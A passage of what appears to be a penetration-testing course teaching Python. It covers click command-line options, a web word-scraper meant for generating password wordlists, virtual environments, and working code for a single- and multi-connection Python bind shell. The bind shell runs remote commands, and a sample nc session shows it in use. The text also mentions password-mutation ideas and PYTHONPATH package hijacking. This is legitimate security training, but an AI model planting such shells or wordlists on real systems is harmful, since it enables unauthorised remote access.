<p>To understand what <code>click</code> does, we need to talk about <code>decorators</code>. However, since this is a bit of a mouthful to jump right into, let us leave it as optional reading at the end of this section. All we need to know about <code>click</code> at this point is a few simple click-specific concepts that are easy to memorize. Let us get started by installing it as always using pip: <code>pip3 install click</code>. The following is an example script from the official documentation, but slightly modified for simplicity&#39;s sake:</p>
<p><strong>A Simple Click Script</strong></p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> <span class="hljs-built_in">click</span>

@<span class="hljs-built_in">click</span>.command()
@<span class="hljs-built_in">click</span>.option(<span class="hljs-string">'--count'</span>, <span class="hljs-built_in">default</span>=<span class="hljs-number">1</span>, help=<span class="hljs-string">'Number of greetings.'</span>)
@<span class="hljs-built_in">click</span>.option(<span class="hljs-string">'--name'</span>, prompt=<span class="hljs-string">'Your name'</span>, help=<span class="hljs-string">'The person to greet.'</span>)
def hello(count, name):
    <span class="hljs-built_in">for</span> i in range(count):
        <span class="hljs-built_in">click</span>.echo(<span class="hljs-string">'Hello %s!'</span> % name)

<span class="hljs-built_in">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    hello()
</code></pre>
<p>Lots of new things happened here in relatively few lines of code. First of all, there are the <code>decorators</code> which, in a sense, &quot;decorate functions.&quot; These are the things about the function definition that start with an <code>@</code>. We need to focus on not getting too technical too quickly because these decorators in <code>click</code> let us set up command-line arguments to the script. First, we specify the <code>@click.command()</code> decorator, indicating that we will have a command-line input for this <code>hello</code> function. Then two <code>@click.option</code> options are specified. In this example, the parameters are pretty straightforward: we have got a <code>default</code> for the count, in case this is not specified as a command-line argument, we have <code>help</code> text for the <code>--help</code> output, and we have a <code>prompt</code> parameter. This tells Python to <code>prompt</code> the user for input if no command-line argument is given.</p>
<p>Lastly and probably most importantly, notice that all the &quot;main part&quot; of the code does is call the <code>hello()</code> function. Click requires us to call a function with these decorators specified to work. Also, notice that the parameter names for the function <code>hello</code> and the input argument names <code>--count</code> and <code>--name</code> match names if we ignore the <code>--</code>.</p>
<p>Let us look at some examples to illustrate things better. First up is a plain run without any arguments. Here we are prompted for an input for the <code>--name</code> parameter:</p>
<p><strong>Playing With Click</strong></p>
<p>&#x20; Further Improvements</p>
<pre><code class="lang-cmd-session">C:\Users\<span class="hljs-keyword">Birb&gt; </span>python click_test.py

<span class="hljs-symbol">Your</span> name: <span class="hljs-keyword">Birb
</span><span class="hljs-symbol">Hello</span> <span class="hljs-keyword">Birb!</span>
</code></pre>
<p>This we can also specify explicitly:</p>
<p>&#x20; Further Improvements</p>
<pre><code class="lang-cmd-session">C:\Users\<span class="hljs-keyword">Birb&gt; </span>python click_test.py --name <span class="hljs-keyword">Birb
</span>
<span class="hljs-symbol">Hello</span> <span class="hljs-keyword">Birb!</span>
</code></pre>
<p>Moreover, the <code>--count</code> parameter can be explicitly set instead of it being 1 by default:</p>
<p>&#x20; Further Improvements</p>
<pre><code class="lang-cmd-session">C:\Users\<span class="hljs-keyword">Birb&gt; </span>python click_test.py --name <span class="hljs-keyword">Birb </span>--<span class="hljs-built_in">count</span> <span class="hljs-number">3</span>

Hello <span class="hljs-keyword">Birb!
</span>Hello <span class="hljs-keyword">Birb!
</span>Hello <span class="hljs-keyword">Birb!</span>
</code></pre>
<p>Lastly, here is the <code>--help</code> output:</p>
<p>&#x20; Further Improvements</p>
<pre><code class="lang-cmd-session">C:\Users\Birb&gt; python click_test.py --help

Usage: click_test.py [OPTIONS]

Options:
  --count INTEGER  Number of greetings.
  --name TEXT      The person to greet.
  --help           Show this message and <span class="hljs-keyword">exit</span>.
</code></pre>
<p>As we can see in the help message, <code>INTEGER</code> and <code>TEXT</code> are printed. However, we never actually specified this in the code. The reason is that <code>click</code> will attempt to <code>guess the correct type</code> based on things like the <code>default</code> parameter. For more information, please refer to the (relatively well written) documentation.</p>
<p>In preparation for using <code>click</code>, we will move all the code previously in the &quot;main part&quot; of the script into its own, new <code>main()</code> function. The name of this new function is not essential as long as the function is being called.</p>
<p><strong>Refactoring Into Separate Function</strong></p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
    page_url = <span class="hljs-string">'http://target:port'</span>
    the_words = get_all_words_from(page_url)
    top_words = get_top_words_from(the_words)

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):
        print(top_words[i][<span class="hljs-number">0</span>])

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    main()
</code></pre>
<p>We then need to add the click functionality to the function, as well as replace variables where needed:</p>
<p><strong>Adding Click Options</strong></p>
<pre><code class="lang-python"><span class="hljs-variable">@click</span>.command()
<span class="hljs-variable">@click</span>.option(<span class="hljs-string">'--url'</span>, <span class="hljs-string">'-u'</span>, prompt=<span class="hljs-string">'Web URL'</span>, help=<span class="hljs-string">'URL of webpage to extract from.'</span>)
<span class="hljs-variable">@click</span>.option(<span class="hljs-string">'--length'</span>, <span class="hljs-string">'-l'</span>, default=<span class="hljs-number">0</span>, help=<span class="hljs-string">'Minimum word length (default: 0, no limit).'</span>)
def main(url, length):
    the_words = get_all_words_from(url)
    top_words = get_top_words_from(the_words, length)
    # Remaining code omitted
</code></pre>
<p>As can be seen, we added two parameters to the function, <code>url</code> and <code>length</code>, and used these instead of the hardcoded URL we used before. The parameter names must be the same as the <code>--name</code> in the option spec for click to automatically map the input to those variables. If we were to use an input argument (i.e., a <code>click.option</code>) that had to be different than the parameter name in Python - e.g., for aesthetic reasons - we could tell <code>click</code> to map the variables appending the Python parameter name after the argument option names, e.g., <code>@click.option(&#39;--url&#39;, &#39;-u&#39;, &#39;target_uri&#39;, ...)</code>.</p>
<p>In this case, we can let the <code>count_occurrences_in</code> function deal with the filtering. To do this, we need to first pass in the length variable into the <code>get_top_words_from</code> function, and inside this one, pass it along to the <code>count_occurrences_in</code> function. There are many ways to do this. If we were to add another filtering option, e.g., only find words that match some regex, it could be a good idea to keep the filtering a separate process that can apply a filter on a list of words and return those that match. The following two functions were updated:</p>
<pre><code class="lang-python">def count_occurrences_in(word_list, min_length):
    word_count = {}

    <span class="hljs-keyword">for</span> <span class="hljs-built_in">word</span> <span class="hljs-keyword">in</span> word_list:
        <span class="hljs-keyword">if</span> len(<span class="hljs-built_in">word</span>) &lt; min_length:
            <span class="hljs-keyword">continue</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">word</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> word_count:
            word_count[<span class="hljs-built_in">word</span>] = <span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            current_count = word_count.<span class="hljs-keyword">get</span>(<span class="hljs-built_in">word</span>)
            word_count[<span class="hljs-built_in">word</span>] = current_count + <span class="hljs-number">1</span>
<span class="hljs-built_in">    return</span> word_count

def get_top_words_from(all_words, min_length):
    occurrences = count_occurrences_in(all_words, min_length)
<span class="hljs-built_in">    return</span> sorted(occurrences.items(), key=lambda <span class="hljs-built_in">item</span>: <span class="hljs-built_in">item</span>[<span class="hljs-number">1</span>], <span class="hljs-built_in">reverse</span>=True)
</code></pre>
<p>Starting at the bottom, we pass along the <code>min_length</code> parameter to the first function. In here we add one additional check: <code>if len(word) &lt; min_length</code>. If it is, we <code>continue</code>, which in the context of a loop means &quot;do not bother about the rest of this block, simply skip ahead to the next element and forget about this one.&quot; So, if the word is shorter than our minimum length, we will <code>continue</code> to the next word and thus <em>not</em> add it to the <code>word_count</code> dictionary.</p>
<p>The final script looks like this:</p>
<p><strong>The Final Script</strong></p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> click
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_html_of</span><span class="hljs-params">(url)</span>:</span>
    resp = requests.get(url)

    <span class="hljs-keyword">if</span> resp.status_code != <span class="hljs-number">200</span>:
        print(f<span class="hljs-string">'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...'</span>)
        exit(<span class="hljs-number">1</span>)

    <span class="hljs-keyword">return</span> resp.content.decode()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">count_occurrences_in</span><span class="hljs-params">(word_list, min_length)</span>:</span>
    word_count = {}

    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> word_list:
        <span class="hljs-keyword">if</span> len(word) &lt; min_length:
            <span class="hljs-keyword">continue</span>
        <span class="hljs-keyword">if</span> word <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> word_count:
            word_count[word] = <span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            current_count = word_count.get(word)
            word_count[word] = current_count + <span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> word_count

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_all_words_from</span><span class="hljs-params">(url)</span>:</span>
    html = get_html_of(url)
    soup = BeautifulSoup(html, <span class="hljs-string">'html.parser'</span>)
    raw_text = soup.get_text()
    <span class="hljs-keyword">return</span> re.findall(<span class="hljs-string">r'\w+'</span>, raw_text)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_top_words_from</span><span class="hljs-params">(all_words, min_length)</span>:</span>
    occurrences = count_occurrences_in(all_words, min_length)
    <span class="hljs-keyword">return</span> sorted(occurrences.items(), key=<span class="hljs-keyword">lambda</span> item: item[<span class="hljs-number">1</span>], reverse=<span class="hljs-keyword">True</span>)

<span class="hljs-meta">@click.command()</span>
<span class="hljs-meta">@click.option('--url', '-u', prompt='Web URL', help='URL of webpage to extract from.')</span>
<span class="hljs-meta">@click.option('--length', '-l', default=0, help='Minimum word length (default: 0, no limit).')</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(url, length)</span>:</span>
    the_words = get_all_words_from(url)
    top_words = get_top_words_from(the_words, length)

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):
        print(top_words[i][<span class="hljs-number">0</span>])

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    main()
</code></pre>
<p>For the extra adventurous student, here is a list of ideas for further extension of the tool:</p>
<ul>
<li>Add a <code>--output</code> / <code>-o</code> argument that lets us define an output file to print to instead of the console (something like <code>with open(&#39;path.txt&#39;, &#39;w&#39;) as wr:</code> and <code>wr.write(word)</code>).</li>
<li>Add common password mutations to the output, e.g., Capitalized, lowercase, UPPERCASE, and with various bits appended like the current and recent years, random numbers or symbols, e.g., 2019, 1!, 2!, 3!, 01, 123. <code>Summer2021!</code> and similar variations are depressingly frequent passwords.</li>
<li>Add a <code>--depth</code> / <code>-d</code> argument specifying the <em>crawl depth</em> of the script. This implies the ability to grab not only words but also URLs on the webpage(s), check if they are within scope (e.g., domain), and add them to a list of pages to crawl next.</li>
<li>The program currently crashes if a minimum length of 10 or higher is specified. Try to figure out why and fix it (hint: check out that last for-loop).</li>
</ul>
<hr>
<h2 id="a-simple-bind-shell">A Simple Bind Shell</h2>
<hr>
<p>Upon gaining access to an internal web service with the credentials we generated using the previous tool, we can get remote code execution on the web host. Trying to use our go-to reverse shells mysteriously does not seem to work, but we discover that we can execute arbitrary python scripts. Let us abuse that discovery by implementing and running our own Python <code>bind shell</code>.</p>
<p>A bind shell is at its core reasonably simple. It is a process that binds to an address and port on the host machine and then listens for incoming connections to the socket. When a connection is made, the bind shell will - repeatedly - listen for bytes being sent to it and treat them as raw commands to be executed on the system in a subprocess. Once it has received all bytes in chunks of some size, it will run the command on the host system and send back the output. A very naive implementation of such a bind shell is this:</p>
<p><strong>A Simple Bind Shell</strong></p>
<pre><code class="lang-python">import <span class="hljs-built_in">socket</span>
import subprocess
import click

def run_cmd(cmd):
    output = subprocess.run(cmd, <span class="hljs-keyword">stdout</span>=subprocess.PIPE, <span class="hljs-keyword">stderr</span>=subprocess.PIPE, <span class="hljs-built_in">shell</span>=True)
    <span class="hljs-literal">return</span> output.<span class="hljs-keyword">stdout</span>

@click.command()
@click.option(<span class="hljs-string">'--port'</span>, <span class="hljs-string">'-p'</span>, default=<span class="hljs-number">4444</span>)
def main(port):
    s = <span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET, <span class="hljs-built_in">socket</span>.SOCK_STREAM)
    s.bind((<span class="hljs-string">'0.0.0.0'</span>, port))
    s.listen(<span class="hljs-number">4</span>)
    client_socket, address = s.accept()

    <span class="hljs-keyword">while</span> True:
        chunks = []
        chunk = client_socket.recv(<span class="hljs-number">2048</span>)
        chunks.append(chunk)
        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(chunk) != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> chr(chunk[<span class="hljs-number">-1</span>]) != <span class="hljs-string">'\n'</span>:
            chunk = client_socket.recv(<span class="hljs-number">2048</span>)
            chunks.append(chunk)
        cmd = (b<span class="hljs-string">''</span>.join(chunks)).decode()[:<span class="hljs-number">-1</span>]

        <span class="hljs-keyword">if</span> cmd.<span class="hljs-built_in">lower</span>() == <span class="hljs-string">'exit'</span>:
            client_socket.<span class="hljs-built_in">close</span>()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    main()
</code></pre>
<p>Given that we will be sending this to our client, we will improve on code quality and make it more reliable. Nevertheless, first, let us analyze it.</p>
<p>The code consists of two functions so far: a wrapper function for executing commands on the system and one main function that contains all the logic thrown into one place. This is less than ideal. The main function sets up a socket, binds it to <code>0.0.0.0</code> (i.e., all available interfaces) and the desired port. It is then configured to allow at most four unaccepted connections before it starts refusing connections anymore - the <code>listen</code> function configures this. The socket then accepts new incoming connections. This is a so-call <code>blocking call</code>, which means the code will halt at this line of code and wait for a connection to be made. When a connection is established, the <code>accept</code> call returns two things that we store in the variables <code>client_socket</code> and <code>address</code>.</p>
<p>Many things happen in the while loop, so let us break it down into smaller pieces. First, these are our goals:</p>
<ul>
<li>receive all of the incoming bytes from the connected client (our attacker machine),</li>
<li>convert the incoming bytes to a <code>cmd</code> string,</li>
<li>close down the connection if <code>cmd</code> is &quot;exit&quot;,</li>
<li>otherwise execute the command locally and send back the output</li>
</ul>
<p>Notice that we remove the last byte of the <code>cmd</code> string. This is a newline character stemming from hitting enter when typing the command.</p>
<p>When we run this script on our target machine, we can use <code>nc</code> on our attacker machine to connect to the bind shell and gain remote code execution:</p>
<p><strong>Starting the Bind Shell</strong></p>
<p>&#x20; A Simple Bind Shell</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\B</span>irb<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\p</span>ython&gt; python bindshell.py --port 4444
</code></pre>
<p><strong>Connecting to the Bind Shell</strong></p>
<p>&#x20; A Simple Bind Shell</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nc 10.10.10.10 4444 -nv

(UNKNOWN) [10.10.10.10] 4444 (?) <span class="hljs-keyword">open</span>

whoami
localnest\birb

hostname
LOCALNEST

<span class="hljs-keyword">dir</span> 
Volume <span class="hljs-keyword">in</span> drive C has <span class="hljs-keyword">no</span> <span class="hljs-keyword">label</span>.
 Volume Serial Number is 966B-6E6A

 Directory of C:\Users\Birb\Desktop\python

20-03-2021  21:22    &lt;<span class="hljs-keyword">DIR</span>&gt;          .
20-03-2021  21:22    &lt;<span class="hljs-keyword">DIR</span>&gt;          ..
20-03-2021  21:22               929 bindshell.py
               1 <span class="hljs-keyword">File</span>(s)            929 bytes
               2 <span class="hljs-keyword">Dir</span>(s)  518.099.636.224 bytes free
<span class="hljs-keyword">exit</span>
</code></pre>
<p>The downside of the current implementation is that once we disconnect, the bind shell process stops. One way to fix this is to introduce <code>threads</code> and have the command execution part of the code run in a thread. This would allow us to create a new thread every time a machine connects to the shell, and then we would only have to stop the extra thread when the shell exits. Threads, in general, is a vast and complex topic, and Python has its quirks too. To keep a very long and complicated story short and straightforward, threads let us run different code pieces <code>concurrently</code>, similarly to how humans multitask. Note that concurrently is not the same as parallel. In our example, this means that while one thread is busy doing work for our connected client, another thread (the primary one) is ready to accept a new incoming connection. Once another connection is made, these two connected clients can execute code on the victim machine using the same bind shell.</p>
<p>By simply extracting the code that handles command execution to its function, it is possible to make the bind shell first listen for a new connection, spawn a thread for that connection that handles command execution, and finally start over listening to new incoming connections.</p>
<p><strong>Supporting multiple connections</strong></p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> subprocess
<span class="hljs-keyword">import</span> click
<span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_cmd</span><span class="hljs-params">(cmd)</span>:</span>
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="hljs-keyword">True</span>)
    <span class="hljs-keyword">return</span> output.stdout

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">handle_input</span><span class="hljs-params">(client_socket)</span>:</span>
    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        chunks = []
        chunk = client_socket.recv(<span class="hljs-number">2048</span>)
        chunks.append(chunk)
        <span class="hljs-keyword">while</span> len(chunk) != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> chr(chunk[<span class="hljs-number">-1</span>]) != <span class="hljs-string">'\n'</span>:
            chunk = client_socket.recv(<span class="hljs-number">2048</span>)
            chunks.append(chunk)
        cmd = (<span class="hljs-string">b''</span>.join(chunks)).decode()[:<span class="hljs-number">-1</span>]

        <span class="hljs-keyword">if</span> cmd.lower() == <span class="hljs-string">'exit'</span>:
            client_socket.close()
            <span class="hljs-keyword">break</span>

        output = run_cmd(cmd)
        client_socket.sendall(output)

<span class="hljs-meta">@click.command()</span>
<span class="hljs-meta">@click.option('--port', '-p', default=4444)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(port)</span>:</span>
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((<span class="hljs-string">'0.0.0.0'</span>, port))
    s.listen(<span class="hljs-number">4</span>)

    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        client_socket, _ = s.accept()
        t = Thread(target=handle_input, args=(client_socket, ))
        t.start()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    main()
</code></pre>
<p>As we can see, we have added a <code>handle_input</code> function that accepts a <code>client_socket</code> as a parameter. When we create a new <code>Thread</code> object, setting the <code>target</code> (function to run) and the input parameters as a tuple, we can start this thread and let it run in the background. In addition, a <code>from threading import Thread</code> was added at the top. Also, pay close attention to the <code>args</code> in the <code>Thread</code> constructor. This is a tuple with just one value. To differentiate between single value tuples and &quot;scope parentheses&quot;, e.g. <code>(&#39;Hello &#39; + &#39;world&#39;).upper()</code> which will have <code>upper()</code> called on the concatenated string and not just &quot;world&quot;, the syntax for single value tuples is <code>(val1, )</code>. For two value tuples, it is <code>(val1, val2)</code> and so forth. Furthermore, yes, that is a comma and then nothing for single value tuples. Confusing? Perhaps. Just remember that <code>(5)</code> is the same as <code>5</code> because the parentheses are used for grouping, so we would need some way to differentiate between syntactic grouping and a tuple type.</p>
<hr>
<h2 id="managing-libraries-in-python-continued-">Managing Libraries in Python (Continued)</h2>
<hr>
<p>At this point, we have used multiple packages in our projects and even installed third-party packages. These packages physically exist in a predetermined location so that the Python interpreter can locate the packages when we try to import them or elements from inside of them. The default location is the <code>site-packages</code> directory. This is true for Windows systems, however on Debian and Debian-based systems such as Kali, Parrot, and Ubuntu, the external libraries are located inside a <code>dist-packages</code> location. However, the principle is the same.</p>
<p>The default <code>site-packages</code>/<code>dist-packages</code> locations are the following:</p>
<ul>
<li>Windows 10: <code>PYTHON_INSTALL_DIR\Lib\site-packages</code>:</li>
</ul>
<p>&#x20; Managing Libraries in Python (Continued)</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\P</span>ython38<span class="hljs-symbol">\L</span>ib<span class="hljs-symbol">\s</span>ite-packages
</code></pre>
<ul>
<li>Linux: <code>/usr/lib/PYTHON_VERSION/dist-packages/</code>:</li>
</ul>
<p>&#x20; Managing Libraries in Python (Continued)</p>
<pre><code class="lang-shell-session">/usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">python3</span>/<span class="hljs-title">dist</span>-<span class="hljs-title">packages</span></span>
</code></pre>
<p>The reason why packages are located inside a <code>dist-packages</code> rather than a <code>site-packages</code> directory on Debian-based systems stems from how Debian-based systems handle packages installed with the package manager (<code>apt</code>). However, for simplicity&#39;s sake, we will use the common name of <code>site-packages</code> going forward. If we take a look inside this directory, we will see many packages available for Python. A package in all its simplicity is just a folder with at least an <code>__init__.py</code> file inside of it and optionally (although nearly always) other python files and nested folder structures.</p>
<hr>
<h3 id="directories-and-search-paths">Directories and Search Paths</h3>
<p>Instead of producing a fully functional script for scraping words off a website, we decided to write the script as an API. We could package the script together with an <code>__init__.py</code> file (even an empty one is fine) and place the package inside the site-packages directory. Python already knows to check this location when searching for packages. This is not always practical. However, we can tell Python to look in a different directory before searching through the site-packages directory by specifying the <code>PYTHONPATH</code> environment variable. As we can see below, without having set a <code>PYTHONPATH</code> environment variable, the search path includes only the standard directories:</p>
<p><strong>Inspecting the Default Search Path</strong></p>
<p>&#x20; Managing Libraries in Python (Continued)</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python3

Python <span class="hljs-number">3.9</span>.<span class="hljs-number">2</span> (<span class="hljs-keyword">default</span>, Feb <span class="hljs-number">28</span> <span class="hljs-number">2021</span>, <span class="hljs-number">17</span>:<span class="hljs-number">03</span>:<span class="hljs-number">44</span>) 
[GCC <span class="hljs-number">10.2</span>.<span class="hljs-number">1</span> <span class="hljs-number">20210110</span>] <span class="hljs-literal">on</span> linux
Type <span class="hljs-string">"help"</span>, <span class="hljs-string">"copyright"</span>, <span class="hljs-string">"credits"</span> <span class="hljs-keyword">or</span> <span class="hljs-string">"license"</span> <span class="hljs-keyword">for</span> more information.
&gt;&gt;&gt; <span class="hljs-keyword">import</span> sys
&gt;&gt;&gt; sys.path
[<span class="hljs-string">''</span>, <span class="hljs-string">'/usr/lib/python39.zip'</span>, <span class="hljs-string">'/usr/lib/python3.9'</span>, <span class="hljs-string">'/usr/lib/python3.9/lib-dynload'</span>, <span class="hljs-string">'/usr/local/lib/python3.9/dist-packages'</span>, <span class="hljs-string">'/usr/lib/python3/dist-packages'</span>, <span class="hljs-string">'/usr/lib/python3.9/dist-packages'</span>]

&gt;&gt;&gt;
</code></pre>
<p>Now let&#39;s specify a <code>PYTHONPATH</code> environment variable and see how it affects the search path:</p>
<p><strong>Inspecting the default search path</strong></p>
<p>&#x20; Managing Libraries in Python (Continued)</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ PYTHONPATH=/tmp/</span> python3

Python <span class="hljs-number">3.9</span>.<span class="hljs-number">2</span> (<span class="hljs-keyword">default</span>, Feb <span class="hljs-number">28</span> <span class="hljs-number">2021</span>, <span class="hljs-number">17</span>:<span class="hljs-number">03</span>:<span class="hljs-number">44</span>) 
[GCC <span class="hljs-number">10.2</span>.<span class="hljs-number">1</span> <span class="hljs-number">20210110</span>] <span class="hljs-literal">on</span> linux
Type <span class="hljs-string">"help"</span>, <span class="hljs-string">"copyright"</span>, <span class="hljs-string">"credits"</span> <span class="hljs-keyword">or</span> <span class="hljs-string">"license"</span> <span class="hljs-keyword">for</span> more information.
&gt;&gt;&gt; <span class="hljs-keyword">import</span> sys
&gt;&gt;&gt; sys.path
[<span class="hljs-string">''</span>, <span class="hljs-string">'/tmp/'</span>, <span class="hljs-string">'/usr/lib/python39.zip'</span>, <span class="hljs-string">'/usr/lib/python3.9'</span>, <span class="hljs-string">'/usr/lib/python3.9/lib-dynload'</span>, <span class="hljs-string">'/usr/local/lib/python3.9/dist-packages'</span>, <span class="hljs-string">'/usr/lib/python3/dist-packages'</span>, <span class="hljs-string">'/usr/lib/python3.9/dist-packages'</span>]

&gt;&gt;&gt;
</code></pre>
<p>Since we set the <code>PYTHONPATH</code> to the root directory, this has been prepended to the search path. This means two things: first of all, the packages that exist at the <code>/tmp/</code> location can now be imported and used in the project or IDLE, and secondly, it means we can highjack other packages, changing the behavior. The latter point is a bonus if we can control the <code>PYTHONPATH</code> of a system to include our malicious package. We will mainly use the search path to specify where to find our APIs in everyday development scenarios.</p>
<p>Suppose we wanted to have the packages installed in a specific folder. For example, we wanted to keep all packages related to us inside some <code>/var/www/packages/</code> directory. In that case, we can have pip install the package and store the content inside this folder with the <code>--target</code> flag, like so:</p>
<p><strong>Installing Python Modules at Target Location</strong></p>
<p>&#x20; Managing Libraries in Python (Continued)</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python3 -m pip install --target /var/www/packages/ requests

Collecting requests
  Using cached requests<span class="hljs-number">-2.25</span><span class="hljs-number">.1</span>-py2.py3-none-any.whl (<span class="hljs-number">61</span> kB)
Collecting urllib3&lt;<span class="hljs-number">1.27</span>,&gt;=<span class="hljs-number">1.21</span><span class="hljs-number">.1</span>
  Downloading urllib3<span class="hljs-number">-1.26</span><span class="hljs-number">.4</span>-py2.py3-none-any.whl (<span class="hljs-number">153</span> kB)
     || <span class="hljs-number">153</span> kB <span class="hljs-number">8.1</span> MB/s
...SNIP...
</code></pre>
<hr>
<h3 id="virtual-environments">Virtual Environments</h3>
<p>So far, we have looked at installing packages onto the local machine, making packages available to all scripts in our system. If we, for one reason or the other, need to use one specific version of a package for one project and another version of the same package for another project, we will face problems. One solution for this kind of isolation of projects is using <code>virtual environments</code> or <code>venv</code> for short. The <code>venv</code> module allows us to create virtual environments for our projects, consisting of a folder structure for the project environment itself, a copy of the Python binary and files to configure our shell to work with this specific environment. Let us take a look at some examples.</p>
<p>First of all, we will create a virtual environment called <code>academy</code>.</p>
<p><strong>Preparing the Virtual Environment</strong></p>
<p>&#x20; Managing Libraries in Python (Continued)</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ python3 -m venv academy
</code></pre>
<p>Next up, we can source the <code>activate</code> script located in <code>academy/bin/</code>. This configures our shell by setting up the required environment variables so that when we, for example, run <code>pip install requests</code>, we will be using the Python binary that was copied as part of creating the virtual environment, like so:</p>
<p><strong>Sourcing the venv and installing a package</strong></p>
<p>&#x20; Managing Libraries in Python (Continued)</p>
<pre><code class="lang-shell-session">Fugl@htb[/htb]$ source academy/bin/activate
(academy) Fugl@htb[/htb]$ pip install requests

Collecting requests
  Using cached requests<span class="hljs-number">-2.25</span><span class="hljs-number">.1</span>-py2.py3-none-any.whl (<span class="hljs-number">61</span> kB)
Collecting idna&lt;<span class="hljs-number">3</span>,&gt;=<span class="hljs-number">2.5</span>
...SNIP...
Successfully installed certifi<span class="hljs-number">-2020.12</span><span class="hljs-number">.5</span> chardet<span class="hljs-number">-4.0</span><span class="hljs-number">.0</span> idna<span class="hljs-number">-2.10</span> requests<span class="hljs-number">-2.25</span><span class="hljs-number">.1</span> urllib3<span class="hljs-number">-1.26</span><span class="hljs-number">.4</span>
</code></pre>
<p>Notice the <code>(academy)</code> prefix after sourcing the <code>activate</code> script. This indicates that our terminal is configured to run commands for that particular virtual environment.</p>
<p>For penetration testing, it can be advisable to use virtual environments so that projects and packages related to those projects are kept separate. This will ensure that when we know that a project works as is, it will not break in the future because, for example, an external package was updated when working on another project.</p>
<hr>
<h3 id="in-closing">In Closing</h3>
<p>There are many ways to achieve the same goal. We have looked at some of them, and they will get us very far; however, there are better tools and solutions for larger or more permanent projects. Say we developed a custom <code>C2</code> (<code>Command &amp; Control</code>) in Python and needed a reliable and separate environment to host the server in. Virtual environments will likely work fine, but an alternative is to use container software such as <code>Docker</code> or even a fully isolated Virtual Machine. For larger software projects in Python, virtual environments might be pleasing for parts of the way. Additionally, package- and environment management software such as <a href="https://docs.conda.io/en/latest/">Conda</a> will allow greater control of the project, especially when collaborating with others. These technologies and methodologies are worthy of their own modules.</p>
<hr>
<h3 id="exercises">Exercises</h3>
<p>For the exercises in this section, please find below the relevant code blocks.</p>
<p><strong>Question 1</strong></p>
<pre><code class="lang-python">foo = <span class="hljs-built_in">set</span>()

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">42</span>):
    foo.<span class="hljs-built_in">add</span>(<span class="hljs-string">'Cake'</span>)

foo.<span class="hljs-built_in">add</span>(<span class="hljs-string">'Hello'</span>)
foo.<span class="hljs-built_in">add</span>(<span class="hljs-string">'World'</span>)
</code></pre>
<p><strong>Question 2</strong></p>
<pre><code class="lang-python"><span class="hljs-attr">x_coordinate</span> = (<span class="hljs-number">42</span>,)
</code></pre>
<hr>
